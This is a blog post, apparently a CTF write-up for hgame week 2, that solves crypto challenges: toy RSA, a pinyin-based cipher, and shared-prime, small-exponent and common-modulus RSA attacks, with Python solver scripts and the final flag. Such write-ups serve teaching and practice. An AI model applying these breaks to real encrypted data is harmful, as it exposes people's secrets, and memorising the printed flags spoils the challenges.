@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言第二周果然麻中麻，密码和xss把我折磨了，这里直接预告下周摆烂。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【hgame week2】write up">
+<meta property="og:url" content="http://example.com/2022/02/04/%E3%80%90hgame-week2%E3%80%91write-up/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言第二周果然麻中麻，密码和xss把我折磨了，这里直接预告下周摆烂。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/chGSHpY9ROJbNer.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/Yv8Vca5suKeLMS3.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/3bFjVsCiahYm42O.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/Gn39RbszCYyLQfi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/rHzCQB7kgXwRNiT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/49NOSLKcEHsRDF2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/dulBXJy9p6cYHon.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/xuq8FnrAvWgltaV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/OoQzfmtFKA5YMSP.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/cWtqoix126Ka8sE.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/jFbGSVK5a7JCm4i.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/3aOYe8IBUvx7wmg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/PwVnRDrJAUlaxfL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/31/oClWa1xuZz7rqSv.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/AOcqpS7isTFUbIw.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/RwgerqOEnu5BizU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/exB64r8Ydb7PWSo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/hApDy5zP6mCvl8e.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/k8Rr42QL5ojsUPu.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/rcbfekXxyBRC8QK.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/UCS5Omx8qzR6JHn.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/ORdaT14MxY62JrQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/Rc67QNBfeLwxyGP.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/U169IQOdTVjeE7m.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/8AZ6UGdDeHqOBlT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/bIQi4oalyzVwSXO.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/01/Cmwev7RnGSJhzg4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/03/2XAPzlBN45IJif7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/PswZYCVXbenDpOm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/03/wXgTo8cWvYtrZ4p.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/p9McqWPBViluATR.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/OjyWP19hkwSNqdK.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/p3Cvyj6WSJDB9so.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/4jzMHsO7kxQbJvl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/zVbwQ69AqMZaflE.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/02/scURBC5GakMgvxq.png">
+<meta property="article:published_time" content="2022-02-04T12:12:48.000Z">
+<meta property="article:modified_time" content="2022-02-04T12:13:40.105Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/01/31/chGSHpY9ROJbNer.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/02/04/【hgame-week2】write-up/"/>
+
+
+
+
+
+  <title>【hgame week2】write up | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/%E3%80%90hgame-week2%E3%80%91write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【hgame week2】write up</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-04T20:12:48+08:00">
+                2022-02-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第二周果然麻中麻，密码和xss把我折磨了，这里直接预告下周摆烂。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="RSA-Attack"><a href="#RSA-Attack" class="headerlink" title="RSA Attack"></a>RSA Attack</h2><p>这题的RSA比较简单，n可以直接在线分解，把n分解后直接跑脚本就可以了。<br><img src="https://s2.loli.net/2022/01/31/chGSHpY9ROJbNer.png"></p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">p = 715800347513314032483037</span><br><span class="line">q = 978782023871716954857211</span><br><span class="line">e = 65537</span><br><span class="line">c = 122622425510870177715177368049049966519567512708</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">flag = libnum.n2s(pow(c,d,n))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/01/31/Yv8Vca5suKeLMS3.png"></p>
+<h2 id="Chinese-Character-Encryption"><a href="#Chinese-Character-Encryption" class="headerlink" title="Chinese Character Encryption"></a>Chinese Character Encryption</h2><p>这题真的麻中麻，做的时候心态都崩了。根据提示，加密方式只与拼音有关，并且声调单独加密。这里我分析了半天终于分析出来加密逻辑了：</p>
+<blockquote>
+<p>首先将拼音的所有字母对应的数字相加，比如chao就是3+8+1+15=27；接着再看有几个字母，如果是两个就+64，三个+32，四个不变，五个-32，六个-64；再然后看声调，一声+49，二声+50，三声+51，四声+52场，轻声不变。最后得出来的这个值即为字符串的ascii码值。</p>
+</blockquote>
+<p>根据上述逻辑，编写脚本（实力不行只能写出这种烂脚本了）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pypinyin import lazy_pinyin,Style</span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line"></span><br><span class="line">style = Style.TONE3</span><br><span class="line">a = lazy_pinyin(&#x27;陉萏俦蘭貑謠祥冄剏髯簧凰蕆秉僦笆鼣雔耿睺渺仦殣櫤鄽偟壮褃劳充迧蝔镁樷萾懴雈踺猳钔緲螩蝒醢徣纒漐&#x27;,style=style)</span><br><span class="line">print(a)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">str = 0</span><br><span class="line">for i in range(0,47):</span><br><span class="line">    b = list(a[i])</span><br><span class="line">    for j in range(0,10):</span><br><span class="line">        c = len(b)</span><br><span class="line">        if(j&lt;c-1):</span><br><span class="line">            str += s2n(b[j]) - 96</span><br><span class="line">        else:</span><br><span class="line">                if(b[j]==&#x27;1&#x27;):</span><br><span class="line">                    if(j==2):</span><br><span class="line">                        str += 64</span><br><span class="line">                    if(j==3):</span><br><span class="line">                        str += 32</span><br><span class="line">                    if(j==5):</span><br><span class="line">                        str -= 32</span><br><span class="line">                    if(j==6):</span><br><span class="line">                        str -= 64</span><br><span class="line">                    str += 49</span><br><span class="line">                    flag += chr(str)</span><br><span class="line">                    str=0</span><br><span class="line">                    break</span><br><span class="line">                elif(b[j]==&#x27;2&#x27;):</span><br><span class="line">                    if(j==2):</span><br><span class="line">                        str += 64</span><br><span class="line">                    if(j==3):</span><br><span class="line">                        str += 32</span><br><span class="line">                    if(j==5):</span><br><span class="line">                        str -= 32</span><br><span class="line">                    if(j==6):</span><br><span class="line">                        str -= 64</span><br><span class="line">                    str += 50</span><br><span class="line">                    flag += chr(str)</span><br><span class="line">                    str=0</span><br><span class="line">                    break</span><br><span class="line">                elif(b[j]==&#x27;3&#x27;):</span><br><span class="line">                    if(j==2):</span><br><span class="line">                        str += 64</span><br><span class="line">                    if(j==3):</span><br><span class="line">                        str += 32</span><br><span class="line">                    if(j==5):</span><br><span class="line">                        str -= 32</span><br><span class="line">                    if(j==6):</span><br><span class="line">                        str -= 64</span><br><span class="line">                    str += 51</span><br><span class="line">                    flag += chr(str)</span><br><span class="line">                    str=0</span><br><span class="line">                    break</span><br><span class="line">                elif(b[j]==&#x27;4&#x27;):</span><br><span class="line">                    if(j==2):</span><br><span class="line">                        str += 64</span><br><span class="line">                    if(j==3):</span><br><span class="line">                        str += 32</span><br><span class="line">                    if(j==5):</span><br><span class="line">                        str -= 32</span><br><span class="line">                    if(j==6):</span><br><span class="line">                        str -= 64</span><br><span class="line">                    str += 52</span><br><span class="line">                    flag += chr(str)</span><br><span class="line">                    str=0</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    if(j==2):</span><br><span class="line">                        str += 64</span><br><span class="line">                    if(j==3):</span><br><span class="line">                        str += 32</span><br><span class="line">                    if(j==5):</span><br><span class="line">                        str -= 32</span><br><span class="line">                    if(j==6):</span><br><span class="line">                        str -= 64</span><br><span class="line">                    str += s2n(b[j])</span><br><span class="line">                    flag += chr(str)</span><br><span class="line">                    str=0</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>得到flag：<br><img src="https://s2.loli.net/2022/01/31/3bFjVsCiahYm42O.png"></p>
+<h2 id="RSA-Attack-2"><a href="#RSA-Attack-2" class="headerlink" title="RSA Attack 2"></a>RSA Attack 2</h2><p>RSA多种考法的杂糅，一共三部分，先看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from math import ceil</span><br><span class="line">from Crypto.Util.number import getPrime</span><br><span class="line">from libnum import s2n</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line">flag_parts = list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) / 3)&#125;&#125;&#125;&quot;, flag)))</span><br><span class="line"></span><br><span class="line">print(&quot;# task1&quot;)</span><br><span class="line">m = flag_parts[0]</span><br><span class="line">e = 65537</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">r = getPrime(1024)</span><br><span class="line">n1 = p * q</span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">n2 = r * q</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">print(&quot;e =&quot;, e)</span><br><span class="line">print(&quot;n1 =&quot;, n1)</span><br><span class="line">print(&quot;c1 =&quot;, c1)</span><br><span class="line">print(&quot;n2 =&quot;, n2)</span><br><span class="line">print(&quot;c2 =&quot;, c2)</span><br><span class="line"></span><br><span class="line">print(&quot;# task2&quot;)</span><br><span class="line">m = flag_parts[1]</span><br><span class="line">e = 7</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">n = p * q</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(&quot;e =&quot;, e)</span><br><span class="line">print(&quot;n =&quot;, n)</span><br><span class="line">print(&quot;c =&quot;, c)</span><br><span class="line"></span><br><span class="line">print(&quot;# task3&quot;)</span><br><span class="line">m = flag_parts[2]</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">n = p * q</span><br><span class="line">e1 = getPrime(32)</span><br><span class="line">e2 = getPrime(32)</span><br><span class="line">c1 = pow(m, e1, n)</span><br><span class="line">c2 = pow(m, e2, n)</span><br><span class="line">print(&quot;n =&quot;, n)</span><br><span class="line">print(&quot;e1 =&quot;, e1)</span><br><span class="line">print(&quot;c1 =&quot;, c1)</span><br><span class="line">print(&quot;e2 =&quot;, e2)</span><br><span class="line">print(&quot;c2 =&quot;, c2)</span><br></pre></td></tr></table></figure>
+
+<p>首先是第一部分，可以发现n1、n2有共同的质数q，我们可以利用这一点计算出d，编写脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n1 = 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553</span><br><span class="line">n2 = 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363</span><br><span class="line"></span><br><span class="line">e1 = 65537</span><br><span class="line"></span><br><span class="line">c1 = 965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479</span><br><span class="line">c2 = 11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = libnum.gcd(n1,n2)</span><br><span class="line">q1 = n1//p1</span><br><span class="line">phi1 = (p1-1)*(q1-1)</span><br><span class="line">d1 = libnum.invmod(e1,phi1)</span><br><span class="line">flag = libnum.n2s(pow(c1,d1,n1))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>得到第一部分flag：<br><img src="https://s2.loli.net/2022/01/31/Gn39RbszCYyLQfi.png"></p>
+<p>接着第二部分，可以发现e值非常小，因此可以直接爆破出来，懒得写脚本就拿了份网上python2的来用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: cp936 -*-</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e = 7</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n= 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537</span><br><span class="line">c= 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625</span><br><span class="line"></span><br><span class="line">result = gmpy2.iroot(c, 7)</span><br><span class="line">if result[1]: print &#x27;&#123;:x&#125;&#x27;.format(result[0]).decode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure>
+<p>跑出第二部分flag：<br><img src="https://s2.loli.net/2022/01/31/rHzCQB7kgXwRNiT.png"></p>
+<p>接着看第三部分，纯纯的共模加密，同样从网上扒来python2脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: cp936 -*-</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">n = 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729</span><br><span class="line">e = [2519901323, 3676335737]</span><br><span class="line">c = [3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870, 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = c[0]</span><br><span class="line">c2 = c[1]</span><br><span class="line"></span><br><span class="line">e1 = e[0]</span><br><span class="line">e2 = e[1]</span><br><span class="line"></span><br><span class="line">s = gmpy2.gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line">s1 = s[1]</span><br><span class="line">s2 = s[2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if s1 &lt; 0:</span><br><span class="line">    s1 = -s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"></span><br><span class="line">elif s2 &lt; 0:</span><br><span class="line">    s2 = -s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">print &#x27;&#123;:x&#125;&#x27;.format(int(m)).decode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure>
+<p>跑出第三部分flag：<br><img src="https://s2.loli.net/2022/01/31/49NOSLKcEHsRDF2.png"></p>
+<p>最后组合flag：hgame{RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW}</p>
